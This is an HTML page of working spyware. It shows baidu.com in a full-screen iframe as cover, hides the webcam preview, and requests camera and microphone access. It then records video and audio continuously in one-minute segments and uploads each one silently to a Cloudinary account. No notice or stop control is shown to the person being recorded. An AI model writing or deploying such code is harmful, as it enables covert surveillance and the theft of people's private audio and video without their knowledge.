<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webcam Background Recorder → Cloudinary</title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      overflow: hidden;
    }
    #bg-frame {
      position: absolute; top: 0; left: 0;
      width: 100%; height: 100%;
      border: none;
    }
    #webcam { display: none; }
  </style>
</head>
<body>

  <video id="webcam" autoplay playsinline muted></video>
  <iframe id="bg-frame" src="https://www.baidu.com"></iframe>

  <script>
    const webcamVideo = document.getElementById('webcam');
    let stream, isRecording = false;
    const RECORDING_DURATION = 60000; // 每段视频 1 分钟

    // Cloudinary 配置（只需要 cloud_name 和 upload_preset）
    const CLOUD_NAME = "dxic8oxo1";         // 替换成你自己的
    const UPLOAD_PRESET = "webcam_upload";  // 替换成你新建的 unsigned preset

    // 上传函数
    async function uploadToCloudinary(blob) {
      const formData = new FormData();
      formData.append("file", blob);
      formData.append("upload_preset", UPLOAD_PRESET);

      try {
        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
          method: "POST",
          body: formData
        });
        const data = await res.json();
        if (res.ok) {
          console.log("上传成功:", data.secure_url);
        } else {
          console.error("上传失败:", data);
        }
      } catch (err) {
        console.error("上传错误:", err);
      }
    }

    // 自动录制并上传循环
    async function startRecordingCycle() {
      if (!stream || isRecording) return;
      isRecording = true;
      let chunks = [];

      try {
        const recorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });

        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: "video/webm" });
          chunks = [];
          await uploadToCloudinary(blob);
          isRecording = false;
          startRecordingCycle(); // 下一轮录制
        };

        recorder.start();
        setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, RECORDING_DURATION);

      } catch (err) {
        console.error("MediaRecorder 出错:", err);
        isRecording = false;
      }
    }

    // 初始化摄像头并启动循环
    async function init() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: 1280, height: 720 },
          audio: true
        });
        webcamVideo.srcObject = stream;
        webcamVideo.onloadedmetadata = () => startRecordingCycle();
      } catch (err) {
        console.error("摄像头/麦克风权限出错:", err);
      }
    }

    init();
  </script>
</body>
</html>
